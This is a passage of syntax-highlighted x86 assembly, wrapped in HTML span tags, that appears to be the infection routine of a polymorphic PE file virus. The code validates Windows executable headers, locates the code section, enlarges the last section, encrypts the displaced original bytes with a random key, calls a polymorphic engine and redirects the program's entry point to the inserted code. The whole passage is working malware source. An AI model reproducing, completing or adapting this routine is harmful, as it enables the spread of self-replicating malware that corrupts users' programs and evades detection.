                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mz.mz_id</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__close</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">mz.mz_relnum</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__1</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">mz.mz_relofs</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">__close</span><span class="sc0">

</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mz.mz_neptr</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">pe</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fread</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">pe</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__close</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">pe.pe_ntheadersize</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__close</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">pe.pe_datetime</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__close</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe.pe_entrypointrva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__close</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">@@saveeip</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">@@is_dll</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe.pe_exe_flags</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; executable</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__close</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">       </span><span class="sc1">; dll?    1=fixed</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__method_2</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">pe.pe_dllflags</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__method_2</span><span class="sc0">

</span><span class="sc1">;                       cmp     pe.pe_imagebase x, 400000h</span><span class="sc0">
</span><span class="sc1">;                       jne     __close</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">@@is_dll</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


                        </span><span class="sc1">;;</span><span class="sc0">

                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe.pe_numofobjects</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
</span><span class="sc5">__try_section</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc1">;                       jz      __set_stamp</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__method_2</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">oeV_ptr</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeV</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">oe_struc</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fread</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">oe_struc</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__close</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeV.oe_section_flags</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60000020h</span><span class="sc0"> </span><span class="sc1">; read,exec,code</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60000020h</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__nextsection</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeV.oe_virt_rva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">    </span><span class="sc1">; eax=v.start RVA</span><span class="sc0">

</span><span class="sc5">__restart</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size_infile</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeV.oe_phys_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">__nextsection</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; ebx=v.end RVA</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeV.oe_virt_rva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeV.oe_phys_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">__nextsection</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe.pe_numofrvaandsizes</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">

</span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">js</span><span class="sc0">      </span><span class="sc5">__offset_found</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">pe.pe_rvasizes</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__2</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe.pe_rvasizes</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">__2</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe.pe_rvasizes</span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">__2</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__restart</span><span class="sc0">

</span><span class="sc5">__nextsection</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__try_section</span><span class="sc0">

</span><span class="sc5">__offset_found</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">@@vir_rva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeV.oe_virt_rva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeV.oe_phys_offs</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">@@vir_offset</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeV.oe_virt_rva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe.pe_imagebase</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">@@codesect_pageaddr12</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeV.oe_virt_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4095</span><span class="sc0">
                        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">@@codesect_pagecount</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeV.oe_section_flags</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">@@codesect_flags</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;                       and     oeV.oe_section_flags x, not 80000000h ; clear W</span><span class="sc0">
                        </span><span class="sc6">btr</span><span class="sc0">     </span><span class="sc5">oeV.oe_section_flags</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe.pe_imagebase</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">@@imagebase</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc1">;;</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__read_last_sect</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeL.oe_virt_rva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeL.oe_phys_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">@@orig_rva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeL.oe_phys_offs</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeL.oe_phys_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">@@orig_offs</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dta.dta_filesize</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe.pe_objectalign</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">__method_2</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeL.oe_phys_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeL.oe_virt_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">__size_okey</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeL.oe_virt_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size_infile</span><span class="sc0">
                        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">__method_2</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">oeL.oe_virt_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">pe.pe_imagesize</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">__size_okey</span><span class="sc4">:</span><span class="sc0">


                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">oeL.oe_phys_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size_infile</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">oeL.oe_virt_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size_infile</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">pe.pe_imagesize</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size_infile</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oeL</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">oe_struc</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fwrite</span><span class="sc0">

                        </span><span class="sc1">;;</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">orig_bytes</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size_infile</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@vir_offset</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fread</span><span class="sc0">

                        </span><span class="sc1">;;</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random_eax</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">@@decr_key</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">orig_bytes</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size_infile</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">__encr_1</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__encr_1</span><span class="sc0">

                        </span><span class="sc1">;;</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">orig_bytes</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size_infile</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@orig_offs</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fwrite</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">@@vir_type</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">poly_engine</span><span class="sc0">

                        </span><span class="sc1">;;</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@vir_rva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">poly_entrypoint</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">pe.pe_entrypointrva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">poly</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size_infile</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@vir_offset</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fwrite</span><span class="sc0">

                        </span><span class="sc1">;;</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filename_ptr</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'C'</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">__skip_sd</span><span class="sc0">

</span><span class="sc1">;                       mov     eax, [ecx].dword ptr 2</span><span class="sc0">
</span><span class="sc1">;                       or      eax, 20202000h</span><span class="sc0">
</span><span class="sc1">;                       cmp     eax, 'niw\'</span><span class="sc0">
</span><span class="sc1">;                       jne     __skip_sd</span><span class="sc0">

